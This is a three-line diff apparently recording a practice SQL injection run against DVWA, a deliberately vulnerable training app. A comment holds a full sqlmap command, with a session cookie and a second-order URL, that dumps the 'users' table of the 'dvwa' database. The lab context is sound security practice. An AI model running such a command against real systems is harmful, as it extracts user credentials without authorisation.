@@ -1,0 +1,3 @@
+http://dvwa.local/vulnerabilities/sqli/session-input.php (POST)  # /usr/bin/sqlmap -u http://dvwa.local/vulnerabilities/sqli/session-input.php "--cookie=PHPSESSID=7ueicueia9s4o4boorc94c2tal; security=high" --data=id=1&Submit=Submit -p id --output-dir=./sqlres/ --second-url=http://dvwa.local/vulnerabilities/sqli/ -D dvwa -T users --dump
+
+id=1&Submit=Submit
